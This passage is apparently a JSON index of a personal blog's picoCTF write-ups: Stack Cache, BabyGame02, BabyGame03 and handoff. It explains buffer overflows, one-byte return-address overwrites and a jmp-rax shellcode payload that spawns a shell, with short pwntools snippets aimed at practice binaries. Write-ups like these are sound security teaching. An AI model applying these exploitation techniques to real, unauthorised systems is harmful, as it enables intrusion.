win.\nAfter a quick checksec, we find vuln has both NX and a stack canary enabled. So we can probably find a way to leak the stack canary using the UnderConstruction function.\nIdentifying the vulnerabilities We can easily buffer overflow (the offset I used was 14 of \\x90 padding and then I set the new eip as 0x8049E10, the beginning of UnderConstruction) into UnderConstruction, and we get a bunch of leaks:\nIt doesn\u0026rsquo;t seem like the stack canary is very effective. If we overwrite eip with the win function, it does indeed enter win, but no flag seems to be getting printed. Let\u0026rsquo;s analyze it further:\nAha! So if we look closely, what this does is it saves the flag in the stack, and if the flag array is null, it executes a _printf(%s %s);.\nIn my case, I have a flag.txt file created locally, so it doesn\u0026rsquo;t really output anything at all. What it does do though, is save the flag in the stack (also hinted by the challenge name, stack cache).\nWe can see the content of flag.txt being pushed on the stack.\nThe next logical step is making it so that the function called after win is UnderConstruction. We can do this without much hassle since we are working on a 32-bit executable, so no need to work with registers.\nThe stack alignment for 32-bit is function, parameters, return address and since these functions don\u0026rsquo;t need any params we can easily chain a bunch of functions.\npayload = b\u0026#39;\\x90\u0026#39;*14 payload += p32(0x8049D90) #win payload += p32(0x8049E10) #under constr devine ret addr la win payload += p32(0x8049E10) #a bunch of undr constr to leak the flag payload += p32(0x8049E10) #to get a bunch of %p \u0026#39;s payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049E10) payload += p32(0x8049EB0) #main Since I wanted to make sure that we would get all of the flag, not just a part of it, since pico flags are usually pretty long, I chained a lot of UnderConstruction functions together.\nAnd lo and behold! Dumping this into CyberChef, we can see the content of the flag is being shown on the stack, separated into 4 byte chunks with reversed bit order.\nAll that\u0026rsquo;s left to do is connect remotely and see if we can extract the flag.\nAnd that’s it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/stackcache-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eUndefined behaviours are fun. It looks like Dr. Oswal allowed buffer overflows again. Analyse \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/306\"\u003ethis program\u003c/a\u003e\u003c/strong\u003e to identify how you can get to the flag.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/stackcache-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAt first glance, the \u003cstrong\u003evuln\u003c/strong\u003e looks like a 32-bit executable with a buffer overflow vulnerability.\u003c/p\u003e\n\u003cp\u003eAnalyzing the binary, we come across some interesting funtions, \u003ccode\u003eUnderConstruction\u003c/code\u003e and \u003ccode\u003ewin\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/stackcache-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter a quick \u003ccode\u003echecksec\u003c/code\u003e, we find vuln has both NX and a stack canary enabled.\nSo we can probably find a way to leak the stack canary using the \u003ccode\u003eUnderConstruction\u003c/code\u003e function.\u003c/p\u003e","title":"Pico Stack Cache Writeup"},{"content":"Challenge overview Break the game and get the flag. Welcome to BabyGame 02! Navigate around the map and see what you can find!\nAfter analyzing the binary and renaming the variables, we notice we have a player struct/array consisting of the player y, player x.\nImmediately after that, we have the map matrix.\nFrom the main function, by solving the puzzle, which can be easily achieved by using the special command p we \u0026ldquo;win\u0026rdquo;. And with the special command l we can replace the @ player character with a char (spoiler, it can be any byte of our liking, not necessarily a char).\nIdentifying the vulnerabilities What is most likely the vulnerability is that there is no bounds check for the map, and that we can overwrite the variables on the stack by modifying one byte.\nMore precisely, using our player, and moving it out of bounds will allow us to modify the byte at position\nplayer_x + map + 90 * player_y where map is the location of the map buffer on the stack.\nWe notice a win function, so all we need to do is find a way to jump into win. Using the file command, we can see that game is a 32-bit executable, so all the function parameters are stored on the stack.\nProbably so is the return to main inside move_player, so we can set a breakpoint on its return.\nThere is no stack canary or PIE, so nothing that we need to worry about.\nAnd there it is!\nUsing hexdump with GEF, we can analyze the offset from the beginning of map to our return address (the first 0x2e being the first dot inside map). The offset seems to be 39.\nTo modify the return address we need to find a position in win that is one byte away from 0x08049709.\nFor example, 0x804975D works perfectly! So all we need to do is overwrite its LSB 09 with 5D.\nWe can easily achieve this by using the l command. So first, modify it our player to \\x5D, then we move to position map - 39.\nplayer_x + map + 90 * player_y = map - 39\nOne way to solve this is player_x = -39 and player_y = 0. To not mess with other values on the stack that might crash our program, we could first go up to player_y=-2, go to the right player_x, then go back down to player_y=0.\np.recvuntil(b\u0026#39;X\\n\u0026#39;) p.sendline(b\u0026#39;l\u0026#39;+b\u0026#39;\\x5D\u0026#39;) p.recvuntil(b\u0026#39;X\\n\u0026#39;) p.sendline(b\u0026#39;w\u0026#39;*4 + b\u0026#39;a\u0026#39;*4 + b\u0026#39;w\u0026#39;*2 +b\u0026#39;a\u0026#39;*39+b\u0026#39;s\u0026#39;*2) Some problems\u0026hellip; It seems to be working fine locally, but remotely we stumble upon another issue.\nAnd then another issue?\nIn these kinds of situations, what happens is some things get aligned differently, so the best thing to do is try other addresses near what we found.\nThe first one I found that works is \\x60, and with that we get the flag!\nAnd that’s it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/babygame02-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eBreak the game and get the flag. Welcome to \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/346\"\u003eBabyGame 02\u003c/a\u003e\u003c/strong\u003e! Navigate around the map and see what you can find!\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/babygame02-writeup/pic1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter analyzing the binary and renaming the variables, we notice we have a \u003cstrong\u003eplayer struct/array\u003c/strong\u003e consisting of the \u003cstrong\u003eplayer y\u003c/strong\u003e, \u003cstrong\u003eplayer x\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eImmediately after that, we have the \u003cstrong\u003emap matrix\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/babygame02-writeup/pic2.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eFrom the \u003ccode\u003emain\u003c/code\u003e function, by solving the puzzle, which can be easily achieved by using the special command \u003ccode\u003ep\u003c/code\u003e we \u0026ldquo;win\u0026rdquo;. And with the special command \u003ccode\u003el\u003c/code\u003e we can replace the \u003ccode\u003e@\u003c/code\u003e player character with a char (spoiler, it can be any byte of our liking, not necessarily a char).\u003c/p\u003e","title":"Pico Babygame02 Writeup"},{"content":"Challenge overview Break the game and get the flag. Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don\u0026rsquo;t have many moves. There are obstacles that instantly end the game on collision. The game is available to download here. There is no source available, so you\u0026rsquo;ll have to figure your way around the map.\nAfter analyzing the binary and renaming the variables, we notice we have a player struct/array consisting of the player y, player x and player lives.\nImmediately after that, we have the map matrix.\nWe immediately run intos a couple of problems. We need to reach level 5 to win and to print the flag (image below), but we cannot move past level 4 because of the if condition inside of the while.\nFirst, let’s worry about getting up to level 4. We notice that we have a couple of special commands inside the move_player function, Such as p to solve the level and l to change the current playertile from @.\nThe only issue with directly using the solve function is that we have a limited amount of lives/moves, and it doesn\u0026rsquo;t account for that.\nIdentifying the vulnerabilities Since the map is initialized immediately after the player lives, and there is no bounds check for the player, we can modify the tile at position map-4 (map is a 1d array from 0 to 30x90-2) so that we overwrite player_lives with 0x23 (the dot).\nplayer_arr[1] + map + 90 * player_arr basically represents the current player position on the map, and it could also be written as player_x + map + 90 * player_y.\nSo if we modify player_x to 86 and player_y to -1 we reach \u0026ldquo;player position\u0026rdquo; map-4 (out of bounds), and then we can overwrite it for unlimited lives.\nThe payload I found to reach this position (including the solve function):\npayload = b\u0026#39;www\u0026#39;+b\u0026#39;a\u0026#39;*8+b\u0026#39;wsp\u0026#39; We repeat this until we reach level 4, where things start to get a little bit more complicated.\nUsing GDB (in my case, GEF) to analyze the stack, we can find the return address of the move_player function (which is 0x804992c) \u0026ndash; by setting a breakpoint on the retn of move_player, 0x804969F, of course.\nIf we can modify that return value (which returns to main) to another address in main that comes after the level != 4 check, we can essentially reach level 5.\nIn this case, the value I chose is 0x8049970. So we only need to modify the LSB of the return value we found on the stack (we can only modify one byte, through playertile, either way).\nThe reason we can modify it is, same as player_lives, that the map array is also located on the stack, a few bytes after our return value! We can use the l command to change our playertile to \\x70.\nTo see exactly how many bytes away it is, we can use hexdump with GEF:\nAnd there it is \u0026ndash; our \\x70 value! If we count the bytes from 2c to 70, we get 51, which is the offset from the LSB to the beginning of the map (in this case our playertile was on map[0]). So we would need to go to player_y = 0 and player_x = -51.\nTo avoid getting a SEGFault by messing with all the values on the stack in between, we can first move up to player_y = -3, move to the correct x value, and then go back down to player_y = 0. And it worked!\nNow, to evade the second if problem, which keeps us in the loop, we need to change the return address from 0x804992c again. It would be nice for it to be directly in win, but since we can only modify one byte, the best value we can choose is the call to win() inside of main.\nAgain, lucky for us, that is 0x80499FE! So we modify our playertile to \\xfe, but when we repeat the same technique, something goes wrong. After inspecting the stack again, our map array shifts more towards ebp and we need to use a bigger offset to modify the return address.\nGEF\u0026rsquo;s hexdump wouldn’t show enough addresses, so I had to use this command.\nWe can see now the distance is 67 bytes, so we update the offset in our script, and voila! We got the flag!\nAnd that’s pretty much it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/babygame03-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eBreak the game and get the flag. Welcome to \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/446\"\u003eBabyGame 03\u003c/a\u003e\u003c/strong\u003e! Navigate around the map and see what you can find! Be careful, you don\u0026rsquo;t have many moves. There are obstacles that instantly end the game on collision. The game is available to download here. There is no source available, so you\u0026rsquo;ll have to figure your way around the map.\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/babygame03-writeup/baby-1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eAfter analyzing the binary and renaming the variables, we notice we have a \u003cstrong\u003eplayer struct/array\u003c/strong\u003e consisting of the \u003cstrong\u003eplayer y\u003c/strong\u003e, \u003cstrong\u003eplayer x\u003c/strong\u003e and \u003cstrong\u003eplayer lives\u003c/strong\u003e.\u003c/p\u003e","title":"Pico Babygame03 Writeup"},{"content":"Challenge overview The first vuln we encounter in handoff is that it doesn\u0026rsquo;t disable NX. (Basically, this means that we can execute shellcode on the stack!)\nWe are presented with a menu with 3 options:\nAdd a recipient Send a message to a recipient Exit Upon trying to exit, we are prompted to give our feedback.\nIdentifying the vulnerability Immediately after decompiling the binary, we notice a buffer overflow in its feedback buffer. We can also see that the value at feedback[7] gets turned to \\0. However, the feedback buffer overflow is way too small for us to do anything with it, so our best bet is to find another buffer and jmp to it.\nThe perfect buffer for this is our very large message buffer! Lucky for us, rax gets the return of the previously called function (in this case gets \u0026ndash; and gets\u0026rsquo;s return is exactly our string).\nThis is because gets always returns the string it receives as input.\nSo in our feedback buffer, we need a payload that looks something like jmp addr, nop, nop, nop, until we reach rip, and then overwrite rip with a jmp rax gadget.\nObviously, our jmp addr needs to jump to our longer script, located in the message buffer, using asm(shellcraft.sh()), which will just spawn a shell for us.\nUsing ropper we find our jmp rax gadget:\njmp_rax = p64(0x40116c) We do a search-pattern of our message inside GEF, and we can find it located at $rsp - 670.\nTo find the correct offset, do the search-pattern only AFTER the script executes the jmp rax gadget (I struggled with finding the correct offset because of that for quite a bit).\nPayload Okay, so that basically means we need to do a sub rsp, 670 and a jmp rsp at the beginning of our feedback buffer. To avoid getting our payload messed up by the feedback[8] byte being changed into a null byte, we pad the payload with a few NOPs to its left.\nThen, we just adjust it to the size of the buffer overflow with NOPs, and then glue the jmp_rax gadget to its right.\npayload1 = asm(\u0026#39;nop;nop;sub rsp,670;jmp rsp;\u0026#39;) payload = payload1.ljust(20, b\u0026#39;\\x90\u0026#39;) payload += jmp_rax Don\u0026rsquo;t forget to set context.arch = 'amd64'!!! Otherwise writing assembly code won’t work.\nAnd that’s pretty much it! The rest of the code can be found on my GitHub here.\n","permalink":"https://irinasusca.github.io/writeup-blog/posts/handoff-writeup/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge overview\u003c/h2\u003e\n\u003cp\u003eThe first vuln we encounter in \u003cstrong\u003e\u003ca href=\"https://play.picoctf.org/practice/challenge/486\"\u003ehandoff\u003c/a\u003e\u003c/strong\u003e is that it doesn\u0026rsquo;t disable NX.\n(Basically, this means that we can execute shellcode on the stack!)\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"challenge-screenshot\" loading=\"lazy\" src=\"/writeup-blog/posts/handoff-writeup/handoff-1.png#center\"\u003e\u003c/p\u003e\n\u003cp\u003eWe are presented with a menu with 3 options:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAdd a recipient\u003c/li\u003e\n\u003cli\u003eSend a message to a recipient\u003c/li\u003e\n\u003cli\u003eExit\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eUpon trying to exit, we are prompted to give our feedback.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"identifying-the-vulnerability\"\u003eIdentifying the vulnerability\u003c/h2\u003e\n\u003cp\u003eImmediately after decompiling the binary, we notice a buffer overflow in its feedback buffer.\nWe can also see that the value at \u003ccode\u003efeedback[7]\u003c/code\u003e gets turned to \u003ccode\u003e\\0\u003c/code\u003e. However, the feedback buffer overflow is way too small for us to do anything with it, so our best bet is to find another buffer and \u003ccode\u003ejmp\u003c/code\u003e to it.\u003c/p\u003e","title":"Pico Handoff Writeup"}]